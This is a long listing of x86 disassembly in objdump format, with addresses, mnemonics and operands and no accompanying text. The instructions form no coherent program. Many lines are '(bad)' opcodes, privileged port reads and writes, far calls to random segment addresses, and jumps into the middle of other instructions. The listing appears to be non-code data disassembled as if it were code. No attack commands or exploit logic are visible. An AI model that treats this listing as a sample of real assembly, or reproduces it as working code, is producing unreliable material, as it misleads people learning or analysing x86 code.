  6ab15f:	jmp    0x6ab199
  6ab161:	cmp    eax,0x4027cb2e
  6ab166:	lds    edx,FWORD PTR [ebp+0x72]
  6ab169:	loope  0x6ab1b5
  6ab16b:	xor    edx,DWORD PTR [ecx+ecx*8]
  6ab16e:	jno    0x6ab151
  6ab170:	mov    eax,0xa8ae195d
  6ab175:	push   0x6a7e3ef6
  6ab17a:	in     eax,dx
  6ab17b:	data16 div BYTE PTR [edx+0x68]
  6ab17f:	pop    ecx
  6ab180:	test   al,dl
  6ab182:	pop    edi
  6ab183:	lock cwde 
  6ab185:	je     0x6ab1a2
  6ab187:	pushf  
  6ab188:	call   0x2b8e:0x2f1dcfaa
  6ab18f:	loopne 0x6ab1f9
  6ab191:	push   eax
  6ab192:	mov    eax,0x5a45b971
  6ab197:	ret    0x2dd2
  6ab19a:	arpl   di,bp
  6ab19c:	and    al,0x78
  6ab19e:	xchg   esp,eax
  6ab19f:	call   0xdd7b:0x33744f3d
  6ab1a6:	fisttp DWORD PTR [edx+0x787c92cc]
  6ab1ac:	mov    dh,0x3e
  6ab1ae:	mov    al,0xb7
  6ab1b0:	(bad)  
  6ab1b1:	repnz lds edx,FWORD PTR [edi]
  6ab1b4:	pusha  
  6ab1b5:	xchg   ebp,eax
  6ab1b6:	ret    0x8c27
  6ab1b9:	mov    ah,0xbd
  6ab1bb:	imul   esi,DWORD PTR [edx+0x71f92281],0xc753559e
  6ab1c5:	or     BYTE PTR [ebp-0x4b],dh
  6ab1c8:	inc    ecx
  6ab1c9:	bound  esi,QWORD PTR [ecx+0x3d]
  6ab1cc:	inc    ebp
  6ab1cd:	ds int3 
  6ab1cf:	sti    
  6ab1d0:	push   ss
  6ab1d1:	push   DWORD PTR [ebx]
  6ab1d3:	pop    ebp
  6ab1d4:	xlat   BYTE PTR ds:[ebx]
  6ab1d5:	loope  0x6ab206
  6ab1d7:	inc    ebx
  6ab1d8:	in     al,dx
  6ab1d9:	pop    ecx
  6ab1da:	mov    dh,0x78
  6ab1dc:	push   ebx
  6ab1dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ab1de:	dec    ebx
  6ab1df:	retf   0xf146
  6ab1e2:	stc    
  6ab1e3:	sub    al,0xda
  6ab1e5:	aam    0x51
  6ab1e7:	xor    BYTE PTR [ebx],0x71
  6ab1ea:	add    DWORD PTR [edi-0x86d1f3f],0x8ee90ca4
  6ab1f4:	lea    ebx,[esi+0x44]
  6ab1f7:	jnp    0x6ab273
  6ab1f9:	dec    edx
  6ab1fa:	jbe    0x6ab18e
  6ab1fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ab1fd:	addr16 push esp
  6ab1ff:	std    
  6ab200:	pushf  
  6ab201:	js     0x6ab20d
  6ab203:	add    edi,DWORD PTR [esi+0x33095737]
  6ab209:	ds jns 0x6ab207
  6ab20c:	jg     0x6ab221
  6ab20e:	lods   eax,DWORD PTR ds:[esi]
  6ab20f:	(bad)  [ebx-0x20]
  6ab212:	fisttp DWORD PTR [esp+eax*1+0x53699fd9]
  6ab219:	push   es
  6ab21a:	jbe    0x6ab20d
  6ab21c:	ds pop eax
  6ab21e:	dec    eax
  6ab21f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ab220:	add    BYTE PTR [esi],dh
  6ab222:	and    dh,al
  6ab224:	mov    ?,WORD PTR [ebx-0x3e]
  6ab227:	adc    BYTE PTR [ecx-0x73],bh
  6ab22a:	and    bl,bl
  6ab22c:	pusha  
  6ab22d:	xchg   ebp,eax
  6ab22e:	add    dh,BYTE PTR [ebp+ecx*2+0x43549e08]
  6ab235:	pop    edi
  6ab236:	out    0x21,al
  6ab238:	leave  
  6ab239:	pop    eax
  6ab23a:	or     eax,0xce618c86
  6ab23f:	in     eax,dx
  6ab240:	in     eax,dx
  6ab241:	push   eax
  6ab242:	xor    al,ah
  6ab244:	pop    ebp
  6ab245:	sub    eax,0x849fd3af
  6ab24a:	pop    esp
  6ab24b:	and    ah,BYTE PTR [ebx]
  6ab24d:	xchg   bl,ah
  6ab24f:	sub    eax,0x6056192d
  6ab254:	inc    eax
  6ab255:	into   
  6ab256:	and    eax,0xfa4e5685
  6ab25b:	es push edx
  6ab25d:	imul   esi,DWORD PTR [eax+eax*2-0x5a],0x44
  6ab262:	in     al,dx
  6ab263:	hlt    
  6ab264:	fcmovne st,st(1)
  6ab266:	or     BYTE PTR [ecx-0x945fb83],ah
  6ab26c:	jle    0x6ab246
  6ab26e:	inc    DWORD PTR [eax+0x5174fec4]
  6ab274:	add    esi,DWORD PTR gs:[ebx+0x4d]
  6ab278:	cmp    DWORD PTR fs:0xd64de760,ebx
  6ab27f:	fcomi  st,st(1)
  6ab281:	sar    DWORD PTR [ecx],1
  6ab283:	pop    ss
  6ab284:	mov    bh,ch
  6ab286:	adc    DWORD PTR [ebx],esi
  6ab288:	ffreep st(4)
  6ab28a:	pop    esi
  6ab28b:	push   ebp
  6ab28c:	fsubr  QWORD PTR [ebx]
  6ab28e:	push   eax
  6ab28f:	xor    eax,0x5325c626
  6ab294:	sahf   
  6ab295:	leave  
  6ab296:	test   al,bh
  6ab298:	sbb    DWORD PTR [edi+0x18],0xd6e261ae
  6ab29f:	jl     0x6ab2b8
  6ab2a1:	inc    esp
  6ab2a2:	jmp    0x6ab265
  6ab2a4:	call   0x11c7efde
  6ab2a9:	out    0x21,al
  6ab2ab:	mov    dl,0x21
  6ab2ad:	sub    BYTE PTR [edx+eax*8-0x3fc287b7],ch
  6ab2b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ab2b5:	addr16 into 
  6ab2b7:	imul   esi,DWORD PTR [ecx+0x66],0x61
  6ab2bb:	fsubr  st,st(1)
  6ab2bd:	add    eax,0xee9a2497
  6ab2c2:	mov    al,ds:0x11a6f4eb
  6ab2c7:	stos   BYTE PTR es:[edi],al
  6ab2c8:	xchg   edi,eax
  6ab2c9:	xchg   esp,eax
  6ab2ca:	in     al,0x91
  6ab2cc:	gs sti 
  6ab2ce:	push   es
  6ab2cf:	cs pop edx
  6ab2d1:	xor    esp,DWORD PTR ds:0x133fbddb
  6ab2d7:	jne    0x6ab262
  6ab2d9:	or     cl,cl
  6ab2db:	mov    al,0x32
  6ab2dd:	mov    esi,0x20ec4e5
  6ab2e2:	aaa    
  6ab2e3:	mov    ds:0x87f7e3b7,eax
  6ab2e8:	imul   esp,DWORD PTR [ebx+0x62],0x39d4c91e
  6ab2ef:	and    bl,al
  6ab2f1:	push   eax
  6ab2f2:	jbe    0x6ab27b
  6ab2f4:	sbb    eax,0xa25d8a05
  6ab2f9:	cmc    
  6ab2fa:	lock add BYTE PTR [eax],bh
  6ab2fd:	mov    edi,0x81424055
  6ab302:	jmp    0xbf15ed72
  6ab307:	test   eax,0x66555b0d
  6ab30c:	mov    ah,0xc0
  6ab30e:	cmp    al,0x5c
  6ab310:	js     0x6ab2c2
  6ab312:	mov    ds:0xb60ffa30,al
  6ab317:	nop
  6ab318:	xlat   BYTE PTR ds:[ebx]
  6ab319:	mov    bl,0xdd
  6ab31b:	sbb    BYTE PTR [edi],0x2f
  6ab31e:	jge    0x6ab33c
  6ab320:	xchg   DWORD PTR ds:[ecx+ebp*1],ecx
  6ab324:	jnp    0x6ab2ca
  6ab326:	outs   dx,BYTE PTR ds:[esi]
  6ab327:	stos   BYTE PTR es:[edi],al
  6ab328:	lock jg 0x6ab339
  6ab32b:	mov    bh,0xd2
  6ab32d:	xor    bh,BYTE PTR [ecx]
  6ab32f:	push   cs
  6ab330:	dec    ebx
  6ab331:	jp     0x6ab31c
  6ab333:	and    ch,al
  6ab335:	out    0xf,al
  6ab337:	les    ebp,FWORD PTR [ebx+0x14]
  6ab33a:	xchg   ebp,eax
  6ab33b:	loop   0x6ab2e0
  6ab33d:	mov    bh,0xf2
  6ab33f:	test   DWORD PTR [ebp-0x2753b38d],eax
  6ab345:	call   0x36abc356
  6ab34a:	jae    0x6ab32a
  6ab34c:	jmp    0x172e0d2f
  6ab351:	mov    ecx,0x83c4727a
  6ab356:	mov    ds:0x2783adbc,eax
  6ab35b:	or     esi,DWORD PTR [eax]
  6ab35d:	sar    DWORD PTR [eax+0x36daef5a],cl
  6ab363:	cmp    esi,DWORD PTR [edi+ebx*1-0x5fc9e740]
  6ab36a:	push   edi
  6ab36b:	je     0x6ab2f6
  6ab36d:	xor    DWORD PTR [esp+esi*1+0x7c],esi
  6ab371:	lods   eax,DWORD PTR ds:[esi]
  6ab372:	inc    edx
  6ab373:	test   dh,cl
  6ab375:	cmp    al,0x79
  6ab377:	dec    ecx
  6ab378:	ret    0x49c6
  6ab37b:	xchg   ecx,eax
  6ab37c:	inc    esp
  6ab37d:	ret    0xae58
  6ab380:	mov    ah,BYTE PTR [ebx]
  6ab382:	adc    BYTE PTR [ecx+0x333146fa],al
  6ab388:	pop    ebx
  6ab389:	mov    ss,WORD PTR [ebx+esi*8-0x74]
  6ab38d:	xlat   BYTE PTR ds:[ebx]
  6ab38e:	or     dh,BYTE PTR [ebp+0x1f92981]
  6ab394:	add    DWORD PTR [edi-0x5e174969],ecx
  6ab39a:	rcl    BYTE PTR [ebx],cl
  6ab39c:	add    al,0x9
  6ab39e:	shl    DWORD PTR [ecx-0x79],cl
  6ab3a1:	sbb    al,0x57
  6ab3a3:	lea    esp,[esi-0x5b]
  6ab3a6:	imul   edi,DWORD PTR [edx-0x5d],0x71
  6ab3aa:	adc    DWORD PTR [eax-0x6e],0x4987177b
  6ab3b1:	and    eax,0x5e710446
  6ab3b6:	test   al,0xbc
  6ab3b8:	adc    DWORD PTR [ebx+0x60],edi
  6ab3bb:	retf   0x667c
  6ab3be:	ficom  WORD PTR [eax-0x6d]
  6ab3c1:	fnstenv [esi+edx*8]
  6ab3c4:	enter  0xb224,0x38
  6ab3c8:	cmova  esi,DWORD PTR [ecx]
  6ab3cb:	fucomi st,st(0)
  6ab3cd:	popf   
  6ab3ce:	mov    dh,0xdc
  6ab3d0:	stos   DWORD PTR es:[edi],eax
  6ab3d1:	or     DWORD PTR [ebx+ebp*1-0x76a3c7a2],esi
  6ab3d8:	out    0x6,al
  6ab3da:	dec    ecx
  6ab3db:	stos   BYTE PTR es:[edi],al
  6ab3dc:	and    al,0xe1
  6ab3de:	(bad)  
  6ab3df:	in     eax,dx
  6ab3e0:	ja     0x6ab39a
  6ab3e2:	popa   
  6ab3e3:	cmp    al,0x83
  6ab3e5:	loope  0x6ab40b
  6ab3e7:	out    0xba,eax
  6ab3e9:	jl     0x65bce065
  6ab3ef:	std    
  6ab3f0:	data16 xor bl,BYTE PTR [eax+0x68]
  6ab3f4:	inc    edx
  6ab3f5:	push   edi
  6ab3f6:	fwait
  6ab3f7:	lea    edx,[edi]
  6ab3f9:	in     al,dx
  6ab3fa:	call   0xd296:0x69fc5acb
  6ab401:	cmp    eax,0x98f8d206
  6ab406:	imul   ecx,edx,0x64
  6ab409:	mov    cl,BYTE PTR cs:[ecx+eax*2+0x74]
  6ab40e:	scas   eax,DWORD PTR es:[edi]
  6ab40f:	mov    eax,ds:0x7ac17eac
  6ab414:	daa    
  6ab415:	mov    edi,0x5a7385da
  6ab41a:	push   ebp
  6ab41b:	fst    st(6)
  6ab41d:	fbstp  TBYTE PTR [edx+0x655f92ed]
  6ab423:	jnp    0x6ab3c2
  6ab425:	xor    al,0xfb
  6ab427:	pop    ecx
  6ab428:	(bad)
  6ab42b:	pop    edx
  6ab42c:	scas   eax,DWORD PTR es:[edi]
  6ab42d:	ficomp WORD PTR [edx+0x1e]
  6ab430:	inc    ebx
  6ab431:	mov    ah,0x4c
  6ab433:	adc    dh,dh
  6ab435:	mov    al,0xbf
  6ab437:	xor    ah,BYTE PTR [ebp+0x58b2053e]
  6ab43d:	ins    BYTE PTR es:[edi],dx
  6ab43e:	or     esi,ebx
  6ab440:	cwde   
  6ab441:	enter  0x984,0xda
  6ab445:	daa    
  6ab446:	sar    BYTE PTR [ebx-0x51],0xcd
  6ab44a:	pop    ebp
  6ab44b:	cdq    
  6ab44c:	ja     0x6ab492
  6ab44e:	xor    bl,BYTE PTR [eax+0x17de1362]
  6ab454:	fcom   DWORD PTR [edi+eiz*2+0xaff3e25]
  6ab45b:	or     DWORD PTR [ebx],edi
  6ab45d:	cld    
  6ab45e:	outs   dx,DWORD PTR ds:[esi]
  6ab45f:	imul   edi,DWORD PTR [edx],0xd22c864a
  6ab465:	cmp    eax,0x1aad5ddd
  6ab46a:	lahf   
  6ab46b:	sbb    ebx,DWORD PTR [edx-0x345b0bc2]
  6ab471:	scas   al,BYTE PTR es:[edi]
  6ab472:	(bad)  
  6ab473:	pshufw mm2,QWORD PTR [ebp-0x3da03a3f],0xa
  6ab47b:	pop    ds
  6ab47c:	mov    eax,0x8af4468b
  6ab481:	(bad)  
  6ab482:	mov    al,ds:0xf2f0cfa8
  6ab487:	aam    0x29
  6ab489:	dec    ecx
  6ab48a:	and    BYTE PTR [edx],dh
  6ab48c:	fcom   DWORD PTR [ebp-0x3b]
  6ab48f:	mov    esi,0x9aafa19b
  6ab494:	scas   eax,DWORD PTR es:[edi]
  6ab495:	jmp    ebp
  6ab497:	mov    al,ds:0xad78cacd
  6ab49c:	clc    
  6ab49d:	mov    cs,WORD PTR ds:0x9726497
  6ab4a3:	and    eax,0xdd9af333
  6ab4a8:	jae    0x6ab48c
  6ab4aa:	add    BYTE PTR [ecx+0x52],cl
  6ab4ad:	cmp    dl,BYTE PTR [ecx-0x19]
  6ab4b0:	push   es
  6ab4b1:	jl     0x6ab453
  6ab4b3:	in     al,dx
  6ab4b4:	iret   
  6ab4b5:	sar    DWORD PTR [edx],0x1a
  6ab4b8:	mov    edi,0xc9878424
  6ab4bd:	mov    ah,0xe8
  6ab4bf:	mov    bl,0xf5
  6ab4c1:	mov    al,0xb2
  6ab4c3:	outs   dx,BYTE PTR ds:[esi]
  6ab4c4:	test   eax,0x787a3db0
  6ab4c9:	inc    esi
  6ab4ca:	adc    BYTE PTR [ebx],bl
  6ab4cc:	mov    esp,0x7a7603bb
  6ab4d1:	call   0xa63e086f
  6ab4d6:	push   ebp
  6ab4d7:	mov    ebx,0xfb369463
  6ab4dc:	sub    DWORD PTR [ebp+ebp*4-0x28462923],0x1b58acda
  6ab4e7:	mov    bh,bl
  6ab4e9:	hlt    
  6ab4ea:	mov    edx,0x9148ff4e
  6ab4ef:	in     al,0x49
  6ab4f1:	dec    eax
  6ab4f2:	mov    ah,0x8f
  6ab4f4:	and    DWORD PTR [ebx],ebp
  6ab4f6:	pop    ss
  6ab4f7:	sbb    DWORD PTR [ecx-0x26],ecx
  6ab4fa:	clc    
  6ab4fb:	adc    eax,0xb87ce3a9
  6ab500:	outs   dx,DWORD PTR ds:[esi]
  6ab501:	push   ds
  6ab502:	dec    ecx
  6ab503:	and    DWORD PTR [ebp-0x495f3272],edx
  6ab509:	mov    WORD PTR [edi-0x70],ss
  6ab50c:	int    0x43
  6ab50e:	jns    0x6ab493
  6ab510:	add    cl,BYTE PTR [ebp+0x10]
  6ab513:	xor    ebp,DWORD PTR [ebx]
  6ab515:	dec    esi
  6ab516:	adc    DWORD PTR [eax+0x5a6d8491],eax
  6ab51c:	xchg   esp,eax
  6ab51d:	(bad)  
  6ab51e:	jae    0x6ab52b
  6ab520:	sub    DWORD PTR [eax+0x3d],0xffffffa0
  6ab524:	xlat   BYTE PTR ds:[ebx]
  6ab526:	lds    ebx,FWORD PTR [eax]
  6ab528:	data16 es mov bl,0x75
  6ab52c:	rcr    BYTE PTR [ebx-0x4e],cl
  6ab52f:	or     DWORD PTR [edx],ebx
  6ab531:	gs mov dl,0x6a
  6ab534:	inc    edx
  6ab535:	mov    ebx,0xbce8deed
  6ab53a:	mov    WORD PTR [edx+0x5d],ds
  6ab53d:	sub    ecx,DWORD PTR [ebx-0x63]
  6ab540:	cld    
  6ab541:	mov    ds:0x539c5b61,al
  6ab546:	dec    esp
  6ab547:	jecxz  0x6ab546
  6ab549:	mov    ds:0xd58c4038,eax
  6ab54e:	mov    dh,0xb6
  6ab550:	stc    
  6ab551:	inc    eax
  6ab552:	fstp   QWORD PTR [ebx-0x32]
  6ab555:	mov    edx,0xf5fa4279
  6ab55a:	xchg   edi,eax
  6ab55b:	lock mov cl,0xac
  6ab55e:	cmp    esp,DWORD PTR [eax+0x77]
  6ab561:	fstp   TBYTE PTR [ebx-0x2cbc2aa6]
  6ab567:	je     0x6ab4fb
  6ab569:	pop    ebx
  6ab56a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ab56b:	jbe    0x6ab543
  6ab56d:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  6ab56f:	loopne 0x6ab51b
  6ab571:	test   al,0xb8
  6ab573:	cs inc edi
  6ab575:	repz int 0x6f
  6ab578:	js     0x6ab5d8
  6ab57a:	push   0xd25cdfe3
  6ab57f:	neg    DWORD PTR [ebx+0x4a11222]
  6ab585:	mov    ebp,0x1150ec08
  6ab58a:	dec    edx
  6ab58b:	outs   dx,DWORD PTR ds:[esi]
  6ab58c:	and    cl,BYTE PTR [esi+0x2e]
  6ab58f:	push   ebx
  6ab590:	test   al,0x11
  6ab592:	dec    eax
  6ab593:	mov    eax,0x2f50bd77
  6ab598:	dec    edi
  6ab599:	rcl    bl,cl
  6ab59b:	fisttp QWORD PTR [esi]
  6ab59d:	or     al,dl
  6ab59f:	jns    0x6ab5f7
  6ab5a1:	mov    cl,0x5b
  6ab5a3:	enter  0x29f2,0x19
  6ab5a7:	fs popf 
  6ab5a9:	in     al,0xd0
  6ab5ab:	mov    cl,0x2b
  6ab5ad:	jae    0x6ab5e1
  6ab5af:	dec    esi
  6ab5b0:	adc    eax,0xddae5d0f
  6ab5b5:	repz dec esp
  6ab5b7:	ficom  DWORD PTR [esi]
  6ab5b9:	or     ch,ch
  6ab5bb:	out    dx,al
  6ab5bc:	iret   
  6ab5bd:	pusha  
  6ab5be:	add    ecx,DWORD PTR [ecx*8+0x37b94706]
  6ab5c5:	cmp    ebp,edx
  6ab5c7:	call   0x1430:0xa2f8b56
  6ab5ce:	scas   al,BYTE PTR es:[edi]
  6ab5cf:	daa    
  6ab5d0:	in     ax,dx
  6ab5d2:	jg     0x6ab60b
  6ab5d4:	iret   
  6ab5d5:	and    DWORD PTR [ebx+0x55],0xffffffee
  6ab5d9:	sbb    ah,bl
  6ab5db:	add    eax,0xa8a8ddb8
  6ab5e0:	paddb  mm7,QWORD PTR ds:0xc2dc1ef5
  6ab5e7:	(bad)  
  6ab5e8:	dec    esp
  6ab5e9:	mov    ecx,DWORD PTR [edi-0x35]
  6ab5ec:	sub    ch,BYTE PTR [ecx+0x1c588a50]
  6ab5f2:	inc    esi
  6ab5f3:	add    al,0x80
  6ab5f5:	inc    bp
  6ab5f7:	sub    eax,0x621a5dbe
  6ab5fc:	mov    al,ss:0x67635a0c
  6ab602:	lods   al,BYTE PTR ds:[esi]
  6ab603:	int    0x22
  6ab605:	inc    ebx
  6ab606:	ja     0x6ab601
  6ab608:	xchg   esi,eax
  6ab609:	into   
  6ab60a:	push   cs
  6ab60b:	push   0xb58aeaa2
  6ab610:	mov    edi,0xe0a678e4
  6ab615:	sahf   
  6ab616:	cld    
  6ab617:	test   eax,0xd356d0f3
  6ab61c:	sub    al,0x77
  6ab61e:	mov    al,0xff
  6ab620:	mov    ebp,DWORD PTR [eax]
  6ab622:	outs   dx,BYTE PTR ds:[esi]
  6ab623:	cmp    eax,0x88fc6515
  6ab628:	fadd   QWORD PTR [eax]
  6ab62a:	or     dh,BYTE PTR [edi+0x7e]
  6ab62d:	add    bl,ch
  6ab62f:	or     ebp,DWORD PTR [eax+eiz*1+0x0]
  6ab633:	mov    eax,ds:0x65f4d404
  6ab638:	pusha  
  6ab639:	sbb    al,0xff
  6ab63b:	(bad)  
  6ab63c:	leave  
  6ab63d:	and    al,BYTE PTR [ebx+eiz*2]
  6ab640:	lea    ebx,[edi+0x51]
  6ab643:	adc    al,0x81
  6ab645:	daa    
  6ab646:	stos   DWORD PTR es:[edi],eax
  6ab647:	ror    ah,cl
  6ab649:	push   ss
  6ab64a:	inc    ebp
  6ab64b:	loopne 0x6ab61f
  6ab64d:	(bad)  
  6ab64e:	mov    edx,0xbc841729
  6ab653:	mov    WORD PTR es:[edi],?
  6ab656:	push   0x762b33f5
  6ab65b:	ins    BYTE PTR es:[edi],dx
  6ab65c:	inc    ebx
  6ab65d:	ja     0x6ab653
  6ab65f:	fistp  DWORD PTR [esi+esi*2-0x69c0d9c9]
  6ab666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ab667:	(bad)  
  6ab668:	test   ecx,0x95698d95
  6ab66e:	mov    ds:0xf9cf3250,al
  6ab673:	xchg   ecx,eax
  6ab674:	sahf   
  6ab675:	stos   DWORD PTR es:[edi],eax
  6ab676:	lods   al,BYTE PTR ds:[esi]
  6ab677:	int3   
  6ab678:	push   esi
  6ab679:	mov    dh,0xdf
  6ab67b:	pop    ss
  6ab67c:	mov    cl,0xf4
  6ab67e:	shl    BYTE PTR [esi],1
  6ab680:	inc    ebx
  6ab681:	arpl   dx,bx
  6ab683:	jp     0x6ab66c
  6ab685:	(bad)  
  6ab686:	fidivr WORD PTR [ebx]
  6ab688:	shl    DWORD PTR [edx],1
  6ab68a:	dec    ebp
  6ab68b:	fisttp QWORD PTR [edi+edi*4+0x14]
  6ab68f:	inc    ebp
  6ab690:	enter  0x9fd,0xc4
  6ab694:	fdivr  QWORD PTR ds:0x80fff268
  6ab69a:	dec    edx
  6ab69b:	into   
  6ab69c:	fsub   st,st(0)
  6ab69e:	rcl    ecx,1
  6ab6a0:	loope  0x6ab63b
  6ab6a2:	adc    BYTE PTR [ebx+ebp*1-0x6a0ba96e],dl
  6ab6a9:	jecxz  0x6ab697
  6ab6ab:	js     0x6ab646
  6ab6ad:	push   ebp
  6ab6ae:	retf   0x7eed
  6ab6b1:	mov    ds:0x69d8f10,eax
  6ab6b6:	imul   edi,DWORD PTR [edi],0xab88dd26
  6ab6bc:	lock jecxz 0x6ab672
  6ab6bf:	out    0xee,al
  6ab6c1:	jb     0x6ab72b
  6ab6c3:	ins    DWORD PTR es:[edi],dx
  6ab6c4:	shr    DWORD PTR [edx+esi*4-0x13cb9e45],0x96
  6ab6cc:	cmp    DWORD PTR [eax-0x1e],eax
  6ab6cf:	repz inc ebp
  6ab6d1:	ins    DWORD PTR es:[edi],dx
  6ab6d2:	add    ecx,DWORD PTR [edx+0x2a]
  6ab6d5:	inc    ecx
  6ab6d6:	dec    edx
  6ab6d7:	sbb    eax,0xa0f08a6b
  6ab6dc:	jne    0x6ab69d
  6ab6de:	add    eax,0xc0836c2f
  6ab6e3:	pop    edi
  6ab6e4:	lock mov ?,WORD PTR [edx+0x9a77716]
  6ab6eb:	sbb    BYTE PTR [eax],ah
  6ab6ed:	dec    eax
  6ab6ee:	or     edx,ebp
  6ab6f0:	int3   
  6ab6f1:	jp     0x6ab712
  6ab6f3:	xor    eax,0x73bacf46
  6ab6f8:	shl    DWORD PTR [edx],1
  6ab6fa:	xchg   edx,eax
  6ab6fb:	fiadd  WORD PTR [ebp-0x29]
  6ab6fe:	sbb    DWORD PTR [edi+0x17],esi
  6ab701:	jns    0x6ab775
  6ab703:	and    eax,0x23764f1f
  6ab708:	cmp    eax,DWORD PTR [ebp-0x79658c2e]
  6ab70e:	leave  
  6ab70f:	mov    ds,esi
  6ab711:	push   eax
  6ab712:	data16 jb 0x6ab767
  6ab715:	xlat   BYTE PTR ds:[ebx]
  6ab716:	jp     0x6ab6f1
  6ab718:	rcr    DWORD PTR [ebp+0x75b5bc72],1
  6ab71e:	add    dl,BYTE PTR [eax-0xc]
  6ab721:	daa    
  6ab722:	dec    eax
  6ab723:	dec    esp
  6ab724:	xor    eax,0x22df4307
  6ab729:	xchg   ebx,eax
  6ab72a:	mov    al,0x4c
  6ab72c:	mov    ah,0xb
  6ab72e:	fdiv   DWORD PTR [edi+eiz*1-0x5b]
  6ab732:	push   ds
  6ab733:	aam    0x78
  6ab735:	into   
  6ab736:	(bad)  
  6ab738:	ret    
  6ab739:	jno    0x6ab78b
  6ab73b:	dec    esi
  6ab73c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ab73e:	inc    ebp
  6ab73f:	xor    ebp,DWORD PTR [ebp+0x7ced9dbb]
  6ab745:	xchg   ebp,eax
  6ab746:	fisttp WORD PTR [eax-0x52db9eb8]
  6ab74c:	add    BYTE PTR [ebx],ah
  6ab74e:	outs   dx,BYTE PTR ds:[esi]
  6ab74f:	adc    BYTE PTR [ebx],ah
  6ab751:	sub    dl,BYTE PTR [eax+edi*1+0x58]
  6ab755:	dec    ebx
  6ab756:	or     cl,bh
  6ab758:	mov    cs,edi
  6ab75a:	dec    edi
  6ab75b:	jb     0x6ab74b
  6ab75d:	add    edx,esi
  6ab75f:	push   esi
  6ab760:	pop    ds
  6ab761:	gs aas 
  6ab763:	pop    ecx
  6ab764:	and    ah,BYTE PTR [esi-0x3685721e]
  6ab76a:	in     eax,0x63
  6ab76c:	xchg   edx,eax
  6ab76d:	mov    ds:0x5b3db63c,al
  6ab772:	pop    esi
  6ab773:	popa   
  6ab774:	div    dh
  6ab776:	lahf   
  6ab777:	sbb    cl,BYTE PTR [ecx+0x67]
  6ab77a:	push   ebx
  6ab77b:	in     eax,dx
  6ab77c:	cdq    
  6ab77d:	sub    DWORD PTR [edi+0x2473ca7c],eax
  6ab783:	or     BYTE PTR [esi],bh
  6ab785:	loope  0x6ab76c
  6ab787:	dec    edi
  6ab788:	dec    edx
  6ab789:	inc    edi
  6ab78a:	or     BYTE PTR [ebp+0x7ef3706],dl
  6ab790:	sti    
  6ab791:	inc    ebp
  6ab792:	inc    eax
  6ab793:	scas   eax,DWORD PTR es:[edi]
  6ab794:	cmp    DWORD PTR [ecx],ebp
  6ab796:	push   ss
  6ab797:	sub    BYTE PTR [ebp-0x6f],al
  6ab79a:	jle    0x6ab780
  6ab79c:	push   0xfffffff2
  6ab79e:	push   esp
  6ab79f:	mov    bl,BYTE PTR [esi-0x105a43db]
  6ab7a5:	fnstenv [edx-0x4b82adcd]
  6ab7ab:	pop    edi
  6ab7ac:	sbb    ah,cl
  6ab7ae:	fldenv [ebx+ebx*2]
  6ab7b1:	test   BYTE PTR [ebp+0x69],dl
  6ab7b4:	daa    
  6ab7b5:	pop    es
  6ab7b6:	sub    ebx,0xde35061a
  6ab7bc:	pusha  
  6ab7bd:	call   0x1bda72dc
  6ab7c2:	mov    DWORD PTR [edx],ecx
  6ab7c4:	jbe    0x6ab83d
  6ab7c6:	adc    BYTE PTR [esi],ah
  6ab7c8:	jno    0x6ab7f1
  6ab7ca:	jmp    0x6103:0x1bc420cc
  6ab7d1:	out    0x9b,al
  6ab7d3:	mov    bl,0xbd
  6ab7d5:	lock leave 
  6ab7d7:	hlt    
  6ab7d8:	imul   esp,DWORD PTR [esi],0x42
  6ab7db:	fs iret 
  6ab7dd:	push   esi
  6ab7de:	cmp    esp,DWORD PTR [esi-0x44ca0ac5]
  6ab7e4:	push   eax
  6ab7e5:	dec    edx
  6ab7e6:	cmp    DWORD PTR [ecx-0x1a],edi
  6ab7e9:	mov    bl,0xde
  6ab7eb:	scas   al,BYTE PTR es:[edi]
  6ab7ec:	shr    DWORD PTR [edi+0x69],1
  6ab7ef:	pop    esi
  6ab7f0:	jmp    0xc3d:0x98772d4
  6ab7f7:	(bad)  
  6ab7f8:	jmp    0x83696b0a
  6ab7fd:	xor    edx,ecx
  6ab7ff:	loopne 0x6ab7ea
  6ab801:	dec    eax
  6ab802:	mov    ebx,0xb3bed07a
  6ab807:	les    esp,FWORD PTR [edx+0x55]
  6ab80a:	pusha  
  6ab80b:	adc    al,0x60
  6ab80d:	loope  0x6ab885
  6ab80f:	fsub   DWORD PTR ds:0xd8ae9472
  6ab815:	mov    bh,0xb5
  6ab817:	shl    ecx,1
  6ab819:	test   esp,esi
  6ab81b:	jmp    0x9f0b:0x2ee7f1e7
  6ab822:	ins    BYTE PTR es:[edi],dx
  6ab823:	add    ebp,esp
  6ab825:	test   al,0x21
  6ab827:	dec    edi
  6ab828:	mov    bl,0xfb
  6ab82b:	jmp    0x6ab87f
  6ab82d:	retf   
  6ab82e:	jnp    0x6ab87c
  6ab830:	push   esi
  6ab831:	jmp    0x6ab80f
  6ab833:	jl     0x6ab815
  6ab835:	pop    eax
  6ab836:	add    DWORD PTR ds:0x2ab11cd4,0xfffffff6
  6ab83d:	ret    
  6ab83e:	add    eax,0x6ebad67b
  6ab843:	mov    bl,0x82
  6ab845:	in     al,0x53
  6ab847:	jnp    0x6ab7eb
  6ab849:	dec    ebx
  6ab84a:	push   ebp
  6ab84b:	sbb    esp,eax
  6ab84d:	test   al,0xaf
  6ab84f:	pop    ecx
  6ab850:	fucomp st(7)
  6ab852:	jle    0x6ab861
  6ab854:	shl    bl,1
  6ab856:	js     0x6ab867
  6ab858:	jp     0x6ab7fa
  6ab85a:	fxch   st(0)
  6ab85c:	sbb    dh,BYTE PTR ds:0xfec89acd
  6ab862:	push   0x6b42a2da
  6ab867:	data16 jp 0x6ab8b6
  6ab86a:	cmp    al,0xa9
  6ab86c:	sar    BYTE PTR [edx],1
  6ab86e:	add    al,0x86
  6ab870:	(bad)  
  6ab872:	inc    eax
  6ab873:	xor    DWORD PTR [esi+edx*4+0x21],eax
  6ab877:	call   0xd185:0xd1fad0e6
  6ab87e:	cmp    BYTE PTR [ebp-0x5767ddc7],0xaf
  6ab885:	pop    ds
  6ab886:	call   0x23632d7b
  6ab88b:	cld    
  6ab88c:	add    al,al
  6ab88e:	fisub  DWORD PTR [esi-0x2ca7f40b]
